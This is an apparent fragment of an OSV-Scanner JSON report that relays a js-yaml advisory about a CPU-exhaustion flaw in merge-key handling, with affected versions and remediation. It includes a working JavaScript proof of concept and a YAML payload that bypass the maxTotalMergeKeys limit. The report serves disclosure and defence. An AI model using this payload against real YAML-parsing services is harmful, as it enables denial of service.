              "fullDescription": {
                "markdown": "## Summary\n\n`maxTotalMergeKeys` does not count empty mappings. An attacker can repeatedly merge a large sequence of them and consume significant CPU without reaching the configured limit.\n\n## Example\n\n```yaml\narr: \u0026arr [{}, {}, {}, ...] # N empty mappings\ntargets:\n  - \u003c\u003c: *arr                # repeated K times\n```\n\nFor every target, the loader iterates all `N` elements of `arr`. This results in `O(N * K)` work while `totalMergeKeys` remains unchanged.\n\n## PoC\n\n```js\nimport { performance } from 'node:perf_hooks'\nimport { load, YAML11_SCHEMA } from 'js-yaml'\n\nconst n = 20000\n\nconst src =\n  'arr: \u0026arr [' + '{},'.repeat(n).slice(0, -1) + ']\\n' +\n  'targets:\\n' +\n  '  - \u003c\u003c: *arr\\n'.repeat(n)\n\nconst started = performance.now()\n\nload(src, { schema: YAML11_SCHEMA })\n\nconsole.log(`${(performance.now() - started).toFixed(1)} ms`)\n```\n\nObserved results:\n\n| N | YAML size | Time |\n|---:|---:|---:|\n| 800 | ~13 KB | ~20 ms |\n| 3200 | ~50 KB | ~180 ms |\n| 20000 | ~500 KB | ~13 s |\n\n## Impact\n\nWhen merge keys are enabled, an attacker can submit a relatively small YAML document that causes prolonged CPU consumption despite the default `maxTotalMergeKeys` limit.\n\n## Fix\n\nCount every merge source mapping as one budget unit in addition to counting its keys.",
                "text": "## Summary\n\n`maxTotalMergeKeys` does not count empty mappings. An attacker can repeatedly merge a large sequence of them and consume significant CPU without reaching the configured limit.\n\n## Example\n\n```yaml\narr: \u0026arr [{}, {}, {}, ...] # N empty mappings\ntargets:\n  - \u003c\u003c: *arr                # repeated K times\n```\n\nFor every target, the loader iterates all `N` elements of `arr`. This results in `O(N * K)` work while `totalMergeKeys` remains unchanged.\n\n## PoC\n\n```js\nimport { performance } from 'node:perf_hooks'\nimport { load, YAML11_SCHEMA } from 'js-yaml'\n\nconst n = 20000\n\nconst src =\n  'arr: \u0026arr [' + '{},'.repeat(n).slice(0, -1) + ']\\n' +\n  'targets:\\n' +\n  '  - \u003c\u003c: *arr\\n'.repeat(n)\n\nconst started = performance.now()\n\nload(src, { schema: YAML11_SCHEMA })\n\nconsole.log(`${(performance.now() - started).toFixed(1)} ms`)\n```\n\nObserved results:\n\n| N | YAML size | Time |\n|---:|---:|---:|\n| 800 | ~13 KB | ~20 ms |\n| 3200 | ~50 KB | ~180 ms |\n| 20000 | ~500 KB | ~13 s |\n\n## Impact\n\nWhen merge keys are enabled, an attacker can submit a relatively small YAML document that causes prolonged CPU consumption despite the default `maxTotalMergeKeys` limit.\n\n## Fix\n\nCount every merge source mapping as one budget unit in addition to counting its keys."
              },
              "help": {
                "markdown": "**Your dependency is vulnerable to [GHSA-r3ph-w7gj-g6xm](https://osv.dev/GHSA-r3ph-w7gj-g6xm)**.\n\n## [GHSA-r3ph-w7gj-g6xm](https://osv.dev/GHSA-r3ph-w7gj-g6xm)\n\n\u003cdetails\u003e\n\u003csummary\u003eDetails\u003c/summary\u003e\n\n\u003e ## Summary\n\u003e \n\u003e `maxTotalMergeKeys` does not count empty mappings. An attacker can repeatedly merge a large sequence of them and consume significant CPU without reaching the configured limit.\n\u003e \n\u003e ## Example\n\u003e \n\u003e ```yaml\n\u003e arr: \u0026arr [{}, {}, {}, ...] # N empty mappings\n\u003e targets:\n\u003e   - \u003c\u003c: *arr                # repeated K times\n\u003e ```\n\u003e \n\u003e For every target, the loader iterates all `N` elements of `arr`. This results in `O(N * K)` work while `totalMergeKeys` remains unchanged.\n\u003e \n\u003e ## PoC\n\u003e \n\u003e ```js\n\u003e import { performance } from 'node:perf_hooks'\n\u003e import { load, YAML11_SCHEMA } from 'js-yaml'\n\u003e \n\u003e const n = 20000\n\u003e \n\u003e const src =\n\u003e   'arr: \u0026arr [' + '{},'.repeat(n).slice(0, -1) + ']\\n' +\n\u003e   'targets:\\n' +\n\u003e   '  - \u003c\u003c: *arr\\n'.repeat(n)\n\u003e \n\u003e const started = performance.now()\n\u003e \n\u003e load(src, { schema: YAML11_SCHEMA })\n\u003e \n\u003e console.log(`${(performance.now() - started).toFixed(1)} ms`)\n\u003e ```\n\u003e \n\u003e Observed results:\n\u003e \n\u003e | N | YAML size | Time |\n\u003e |---:|---:|---:|\n\u003e | 800 | ~13 KB | ~20 ms |\n\u003e | 3200 | ~50 KB | ~180 ms |\n\u003e | 20000 | ~500 KB | ~13 s |\n\u003e \n\u003e ## Impact\n\u003e \n\u003e When merge keys are enabled, an attacker can submit a relatively small YAML document that causes prolonged CPU consumption despite the default `maxTotalMergeKeys` limit.\n\u003e \n\u003e ## Fix\n\u003e \n\u003e Count every merge source mapping as one budget unit in addition to counting its keys.\n\n\u003c/details\u003e\n\n---\n\n### Affected Packages\n\n| Source | Package Name | Package Version |\n| --- | --- | --- |\n| lockfile:/home/runner/work/empathy/empathy/egolint/pnpm-lock.yaml | js-yaml | 5.2.2 |\n| lockfile:/home/runner/work/empathy/empathy/egolint/pnpm-lock.yaml | js-yaml | 5.2.3 |\n| lockfile:/home/runner/work/empathy/empathy/pnpm-lock.yaml | js-yaml | 5.2.3 |\n\n## Remediation\n\nTo fix these vulnerabilities, update the vulnerabilities past the listed fixed versions below.\n\n### Fixed Versions\n\n| Vulnerability ID | Package Name | Fixed Version |\n| --- | --- | --- |\n| GHSA-r3ph-w7gj-g6xm | js-yaml | 5.4.1 |\n\nIf you believe these vulnerabilities do not affect your code and wish to ignore them, add them to the ignore list in an\n`osv-scanner.toml` file located in the same directory as the lockfile containing the vulnerable dependency.\n\nSee the format and more options in our documentation here: https://google.github.io/osv-scanner/configuration/\n\nAdd or append these values to the following config files to ignore this vulnerability:\n\n`/home/runner/work/empathy/empathy/egolint/osv-scanner.toml`\n\n```\n[[IgnoredVulns]]\nid = \"GHSA-r3ph-w7gj-g6xm\"\nreason = \"Your reason for ignoring this vulnerability\"\n```\n`/home/runner/work/empathy/empathy/osv-scanner.toml`\n\n```\n[[IgnoredVulns]]\nid = \"GHSA-r3ph-w7gj-g6xm\"\nreason = \"Your reason for ignoring this vulnerability\"\n```\n",
                "text": "**Your dependency is vulnerable to [GHSA-r3ph-w7gj-g6xm](https://osv.dev/GHSA-r3ph-w7gj-g6xm)**.\n\n## [GHSA-r3ph-w7gj-g6xm](https://osv.dev/GHSA-r3ph-w7gj-g6xm)\n\n\u003cdetails\u003e\n\u003csummary\u003eDetails\u003c/summary\u003e\n\n\u003e ## Summary\n\u003e \n\u003e `maxTotalMergeKeys` does not count empty mappings. An attacker can repeatedly merge a large sequence of them and consume significant CPU without reaching the configured limit.\n\u003e \n\u003e ## Example\n\u003e \n\u003e ```yaml\n\u003e arr: \u0026arr [{}, {}, {}, ...] # N empty mappings\n\u003e targets:\n\u003e   - \u003c\u003c: *arr                # repeated K times\n\u003e ```\n\u003e \n\u003e For every target, the loader iterates all `N` elements of `arr`. This results in `O(N * K)` work while `totalMergeKeys` remains unchanged.\n\u003e \n\u003e ## PoC\n\u003e \n\u003e ```js\n\u003e import { performance } from 'node:perf_hooks'\n\u003e import { load, YAML11_SCHEMA } from 'js-yaml'\n\u003e \n\u003e const n = 20000\n\u003e \n\u003e const src =\n\u003e   'arr: \u0026arr [' + '{},'.repeat(n).slice(0, -1) + ']\\n' +\n\u003e   'targets:\\n' +\n\u003e   '  - \u003c\u003c: *arr\\n'.repeat(n)\n\u003e \n\u003e const started = performance.now()\n\u003e \n\u003e load(src, { schema: YAML11_SCHEMA })\n\u003e \n\u003e console.log(`${(performance.now() - started).toFixed(1)} ms`)\n\u003e ```\n\u003e \n\u003e Observed results:\n\u003e \n\u003e | N | YAML size | Time |\n\u003e |---:|---:|---:|\n\u003e | 800 | ~13 KB | ~20 ms |\n\u003e | 3200 | ~50 KB | ~180 ms |\n\u003e | 20000 | ~500 KB | ~13 s |\n\u003e \n\u003e ## Impact\n\u003e \n\u003e When merge keys are enabled, an attacker can submit a relatively small YAML document that causes prolonged CPU consumption despite the default `maxTotalMergeKeys` limit.\n\u003e \n\u003e ## Fix\n\u003e \n\u003e Count every merge source mapping as one budget unit in addition to counting its keys.\n\n\u003c/details\u003e\n\n---\n\n### Affected Packages\n\n| Source | Package Name | Package Version |\n| --- | --- | --- |\n| lockfile:/home/runner/work/empathy/empathy/egolint/pnpm-lock.yaml | js-yaml | 5.2.2 |\n| lockfile:/home/runner/work/empathy/empathy/egolint/pnpm-lock.yaml | js-yaml | 5.2.3 |\n| lockfile:/home/runner/work/empathy/empathy/pnpm-lock.yaml | js-yaml | 5.2.3 |\n\n## Remediation\n\nTo fix these vulnerabilities, update the vulnerabilities past the listed fixed versions below.\n\n### Fixed Versions\n\n| Vulnerability ID | Package Name | Fixed Version |\n| --- | --- | --- |\n| GHSA-r3ph-w7gj-g6xm | js-yaml | 5.4.1 |\n\nIf you believe these vulnerabilities do not affect your code and wish to ignore them, add them to the ignore list in an\n`osv-scanner.toml` file located in the same directory as the lockfile containing the vulnerable dependency.\n\nSee the format and more options in our documentation here: https://google.github.io/osv-scanner/configuration/\n\nAdd or append these values to the following config files to ignore this vulnerability:\n\n`/home/runner/work/empathy/empathy/egolint/osv-scanner.toml`\n\n```\n[[IgnoredVulns]]\nid = \"GHSA-r3ph-w7gj-g6xm\"\nreason = \"Your reason for ignoring this vulnerability\"\n```\n`/home/runner/work/empathy/empathy/osv-scanner.toml`\n\n```\n[[IgnoredVulns]]\nid = \"GHSA-r3ph-w7gj-g6xm\"\nreason = \"Your reason for ignoring this vulnerability\"\n```\n"
              },
              "id": "GHSA-r3ph-w7gj-g6xm",
              "name": "GHSA-r3ph-w7gj-g6xm",
